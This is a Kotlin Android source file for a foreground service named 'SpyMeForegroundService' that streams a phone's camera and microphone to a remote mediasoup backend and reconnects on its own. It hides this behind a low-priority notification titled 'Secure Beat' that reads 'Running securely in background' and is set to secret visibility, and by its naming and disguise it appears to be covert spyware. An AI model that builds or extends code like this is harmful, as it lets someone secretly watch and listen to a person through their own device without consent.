package com.anonymous.scure_beat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class SpyMeForegroundService : Service() {

    private val CHANNEL_ID = "SpyMeServiceChannel"
    private val NOTIFICATION_ID = 1

    private lateinit var mediasoupManager: MediasoupManager
    private val prefs by lazy { getSharedPreferences("spyme_prefs", Context.MODE_PRIVATE) }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isReconnecting = false
    private var reconnectAttempts = 0
    private val MAX_RECONNECT_ATTEMPTS = 10

    override fun onCreate() {
        super.onCreate()
        Log.d("SpyMeService", "Service Created")
        createNotificationChannel()
        mediasoupManager = MediasoupManager(applicationContext)

        val filter =
            android.content.IntentFilter().apply {
                addAction("com.anonymous.scure_beat.TOGGLE_CAMERA")
                addAction("com.anonymous.scure_beat.TOGGLE_MIC")
                addAction("com.anonymous.scure_beat.RECONNECT")
            }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    private val commandReceiver =
        object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    "com.anonymous.scure_beat.TOGGLE_CAMERA" -> mediasoupManager.cycleCamera()
                    "com.anonymous.scure_beat.TOGGLE_MIC" -> mediasoupManager.toggleMic()
                    "com.anonymous.scure_beat.RECONNECT" -> {
                        Log.d("SpyMeService", "Manual reconnect triggered")
                        reconnectToServer()
                    }
                }
            }
        }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SpyMeService", "Service Started")

        // ✅ PERMANENT FOREGROUND NOTIFICATION
        val notification: Notification =
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔒 Secure Beat")
                .setContentText("Running securely in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
                )
            } catch (e: SecurityException) {
                Log.e("SpyMeService", "Failed to start foreground service: ${e.message}")
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Load connection params
        val (roomId, token, username, backendUrl, wsUrl, iceServers) = loadConnectionParams(intent)

        if (roomId.isNotEmpty()) {
            isReconnecting = false
            reconnectAttempts = 0
            mediasoupManager.connect(roomId, token, username, backendUrl, wsUrl, iceServers)
            startReconnectionMonitor()
        } else {
            Log.e("SpyMeService", "No connection params available")
        }

        return START_STICKY
    }

    private fun loadConnectionParams(intent: Intent?): ConnectionParams {
        if (intent != null && intent.hasExtra("ROOM_ID")) {
            val params =
                ConnectionParams(
                    roomId = intent.getStringExtra("ROOM_ID") ?: "",
                    token = intent.getStringExtra("TOKEN") ?: "",
                    username = intent.getStringExtra("USERNAME") ?: "AndroidClient",
                    backendUrl = intent.getStringExtra("BACKEND_URL") ?: "",
                    wsUrl = intent.getStringExtra("WS_URL") ?: "",
                    iceServers = intent.getStringExtra("ICE_SERVERS") ?: "[]",
                )
            saveConnectionParams(params)
            return params
        } else {
            return ConnectionParams(
                roomId = prefs.getString("ROOM_ID", "") ?: "",
                token = prefs.getString("TOKEN", "") ?: "",
                username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
                backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
                wsUrl = prefs.getString("WS_URL", "") ?: "",
                iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
            )
        }
    }

    private fun saveConnectionParams(params: ConnectionParams) {
        prefs
            .edit()
            .putString("ROOM_ID", params.roomId)
            .putString("TOKEN", params.token)
            .putString("USERNAME", params.username)
            .putString("BACKEND_URL", params.backendUrl)
            .putString("WS_URL", params.wsUrl)
            .putString("ICE_SERVERS", params.iceServers)
            .apply()
    }

    private fun startReconnectionMonitor() {
        serviceScope.launch {
            while (true) {
                delay(30000)
                checkConnectionAndReconnect()
            }
        }
    }

    private suspend fun checkConnectionAndReconnect() {
        if (isReconnecting) return
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) return

        // Check if we have active sessions (simple check)
        val hasActiveSessions = true // Implement actual check if needed

        if (!hasActiveSessions) {
            Log.d(
                "SpyMeService",
                "No active sessions, attempting reconnect $reconnectAttempts/$MAX_RECONNECT_ATTEMPTS",
            )
            withContext(Dispatchers.Main) { reconnectToServer() }
        }
    }

    private fun reconnectToServer() {
        if (isReconnecting) return
        isReconnecting = true
        reconnectAttempts++

        Log.d(
            "SpyMeService",
            "🔄 Reconnecting (attempt $reconnectAttempts/$MAX_RECONNECT_ATTEMPTS)",
        )
        updateNotification("Reconnecting... (attempt $reconnectAttempts)")

        val params =
            ConnectionParams(
                roomId = prefs.getString("ROOM_ID", "") ?: "",
                token = prefs.getString("TOKEN", "") ?: "",
                username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
                backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
                wsUrl = prefs.getString("WS_URL", "") ?: "",
                iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
            )

        if (params.roomId.isNotEmpty()) {
            mediasoupManager.disconnect()
            mediasoupManager.connect(
                params.roomId,
                params.token,
                params.username,
                params.backendUrl,
                params.wsUrl,
                params.iceServers,
            )
            serviceScope.launch {
                delay(10000)
                isReconnecting = false
                updateNotification("Connected")
            }
        } else {
            isReconnecting = false
        }
    }

    private fun updateNotification(text: String) {
        val notification: Notification =
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔒 Secure Beat")
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("SpyMeService", "Service Destroyed")
        unregisterReceiver(commandReceiver)
        mediasoupManager.disconnect()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel =
                NotificationChannel(
                    CHANNEL_ID,
                    "Secure Beat Service",
                    NotificationManager.IMPORTANCE_LOW,
                )
            serviceChannel.setShowBadge(false)
            val manager: NotificationManager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private data class ConnectionParams(
        val roomId: String,
        val token: String,
        val username: String,
        val backendUrl: String,
        val wsUrl: String,
        val iceServers: String,
    )
}
